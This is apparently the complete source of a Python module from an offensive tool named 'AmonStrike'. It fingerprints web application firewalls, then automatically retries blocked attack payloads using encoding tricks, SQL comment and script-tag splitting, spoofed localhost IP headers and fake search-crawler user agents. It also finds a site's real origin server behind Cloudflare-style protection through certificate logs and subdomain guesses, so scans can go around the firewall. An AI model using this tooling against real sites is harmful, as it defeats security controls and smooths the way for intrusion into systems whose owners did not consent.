#!/usr/bin/env python3
"""
AmonStrike — WAF Detection & Bypass Engine
Detects WAF, selects bypass technique, retries automatically.
"""
import re, time, random, requests
from urllib.parse import quote

WAF_SIGNATURES = {
    "cloudflare":   ["cloudflare", "cf-ray", "__cfduid", "cf_clearance"],
    "akamai":       ["akamai", "ak_bmsc", "bm_sz"],
    "aws_waf":      ["awswaf", "x-amzn-requestid", "x-amz-cf-id"],
    "imperva":      ["incapsula", "visid_incap", "_incap_ses"],
    "f5":           ["bigip", "f5-bigip", "ts="],
    "sucuri":       ["sucuri", "x-sucuri-id"],
    "barracuda":    ["barra_counter_session", "barracuda_"],
    "fortiweb":     ["fortiwafsid", "cookiesession1"],
    "modsecurity":  ["mod_security", "modsecurity"],
    "nginx_waf":    ["naxsi", "x-naxsi"],
}

BYPASS_TECHNIQUES = {
    # Encoding bypasses
    "url_double_encode":  lambda p: quote(quote(p)),
    "unicode_encode":     lambda p: "".join(f"\\u{ord(c):04x}" for c in p),
    "html_encode":        lambda p: "".join(f"&#{ord(c)};" for c in p),
    "hex_encode":         lambda p: "".join(f"%{ord(c):02x}" for c in p),

    # Case variation
    "case_mix":           lambda p: "".join(c.upper() if i%2==0 else c.lower()
                                            for i,c in enumerate(p)),
    # Comment insertion (SQL/XSS)
    "sql_comment":        lambda p: p.replace(" ", "/**/"),
    "inline_comment":     lambda p: p.replace("<script>", "<scr/**/ipt>"),

    # Whitespace tricks
    "tab_space":          lambda p: p.replace(" ", "\t"),
    "newline_inject":     lambda p: p.replace(" ", "%0a"),

    # Protocol tricks
    "chunked":            None,  # handled in header
    "content_type_mix":   None,
    "method_override":    None,
}

WAF_BYPASS_MAP = {
    "cloudflare":  ["url_double_encode", "unicode_encode", "case_mix"],
    "akamai":      ["html_encode", "sql_comment", "newline_inject"],
    "aws_waf":     ["url_double_encode", "hex_encode", "tab_space"],
    "imperva":     ["unicode_encode", "case_mix", "inline_comment"],
    "modsecurity": ["sql_comment", "url_double_encode", "inline_comment"],
    "generic":     ["url_double_encode", "case_mix", "sql_comment",
                    "hex_encode", "newline_inject"],
}

EVASION_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Host": "localhost"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"Content-Type": "application/x-www-form-urlencoded; charset=ibm037"},
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
]


class WAFBypass:
    def __init__(self, session: requests.Session = None):
        self.session  = session or requests.Session()
        self.detected = None
        self.bypasses_tried = []

    def detect(self, url: str) -> str:
        """Detect WAF from response headers/body. Returns WAF name or 'none'."""
        try:
            r = self.session.get(url, timeout=10, verify=False)
            text = (r.text + str(r.headers)).lower()
            for waf, sigs in WAF_SIGNATURES.items():
                if any(s in text for s in sigs):
                    self.detected = waf
                    return waf
        except Exception:
            pass
        self.detected = "none"
        return "none"

    def blocked(self, status: int, body: str) -> bool:
        """Detect if request was blocked by WAF."""
        if status in [403, 406, 429, 503]:
            block_signals = ["blocked", "security", "firewall", "illegal",
                             "not acceptable", "access denied", "forbidden"]
            return any(s in body.lower() for s in block_signals)
        return False

    def request_with_bypass(self, method: str, url: str,
                            payload: str = "", **kwargs) -> tuple:
        """
        Send request. If blocked, auto-retry with bypass techniques.
        Returns (status, body, bypass_used)
        """
        waf = self.detected or self.detect(url.split("?")[0])
        techniques = WAF_BYPASS_MAP.get(waf, WAF_BYPASS_MAP["generic"])

        # First try: original
        try:
            r = self._send(method, url, payload, **kwargs)
            if not self.blocked(r.status_code, r.text):
                return r.status_code, r.text, "none"
        except Exception:
            pass

        # Retry with each bypass technique
        for tech in techniques:
            if tech in self.bypasses_tried:
                continue
            self.bypasses_tried.append(tech)

            bypass_fn = BYPASS_TECHNIQUES.get(tech)
            bypass_payload = bypass_fn(payload) if bypass_fn and payload else payload
            bypass_url     = url.replace(payload, bypass_payload) if payload in url else url

            # Add evasion headers
            extra_headers = random.choice(EVASION_HEADERS)
            extra_headers["User-Agent"] = random.choice(USER_AGENTS)
            kwargs_copy = dict(kwargs)
            kwargs_copy.setdefault("headers", {}).update(extra_headers)

            try:
                time.sleep(0.5)
                r = self._send(method, bypass_url, bypass_payload, **kwargs_copy)
                if not self.blocked(r.status_code, r.text):
                    return r.status_code, r.text, tech
            except Exception:
                continue

        return 403, "", "all_bypasses_failed"

    def _send(self, method, url, payload="", **kwargs):
        fn = self.session.get if method == "GET" else self.session.post
        return fn(url, timeout=15, verify=False, **kwargs)


class OriginFinder:
    """
    Discovers the real origin IP behind Cloudflare/Akamai/etc.
    If found, scanning the origin directly bypasses the WAF entirely.

    Techniques:
      1. Certificate transparency (crt.sh) — historical hostnames
      2. DNS records of common non-proxied subdomains
      3. Direct IP verification via Host-header match
    """

    CF_RANGES_HINT = ("104.16.", "104.17.", "172.64.", "172.65.",
                      "104.18.", "104.19.", "104.20.", "104.21.",
                      "104.22.", "104.23.", "104.24.", "104.25.",
                      "104.26.", "104.27.", "104.28.", "141.101.",
                      "108.162.", "190.93.", "188.114.", "197.234.",
                      "198.41.", "162.158.", "162.159.", "173.245.")

    COMMON_SUBS = ("direct", "origin", "ftp", "cpanel", "webmail", "mail",
                   "dev", "staging", "test", "api", "admin", "backend",
                   "server", "web", "old", "beta", "vpn")

    def __init__(self, session: requests.Session = None):
        self.session = session or requests.Session()
        self.session.verify = False

    def find(self, domain: str) -> dict:
        """Return {origin_ips, verified_ip, method, cf_ips}."""
        domain = domain.replace("https://","").replace("http://","").split("/")[0]
        result = {"origin_ips": [], "verified_ip": "", "method": "", "cf_ips": []}

        candidates = set()
        candidates |= self._from_crtsh(domain)
        candidates |= self._from_subdomains(domain)

        real = []
        for ip in candidates:
            if any(ip.startswith(pfx) for pfx in self.CF_RANGES_HINT):
                result["cf_ips"].append(ip)
            else:
                real.append(ip)
        result["origin_ips"] = sorted(set(real))

        for ip in result["origin_ips"][:15]:
            if self._verify_origin(domain, ip):
                result["verified_ip"] = ip
                result["method"]      = "host_header_match"
                break
        return result

    def _from_crtsh(self, domain: str) -> set:
        hosts = set()
        try:
            r = self.session.get(f"https://crt.sh/?q=%25.{domain}&output=json", timeout=20)
            if r.status_code == 200:
                for row in r.json():
                    for h in row.get("name_value","").splitlines():
                        h = h.strip().lstrip("*.")
                        if h.endswith(domain):
                            ip = self._resolve(h)
                            if ip:
                                hosts.add(ip)
        except Exception:
            pass
        return hosts

    def _from_subdomains(self, domain: str) -> set:
        ips = set()
        for sub in self.COMMON_SUBS:
            ip = self._resolve(f"{sub}.{domain}")
            if ip:
                ips.add(ip)
        return ips

    def _resolve(self, host: str) -> str:
        import socket
        try:
            return socket.gethostbyname(host)
        except Exception:
            return ""

    def _verify_origin(self, domain: str, ip: str) -> bool:
        for scheme in ("https", "http"):
            try:
                r = self.session.get(
                    f"{scheme}://{ip}",
                    headers={"Host": domain, "User-Agent": random.choice(USER_AGENTS)},
                    timeout=8, allow_redirects=False,
                )
                if r.status_code < 500 and "cf-ray" not in {k.lower() for k in r.headers}:
                    return True
            except Exception:
                continue
        return False
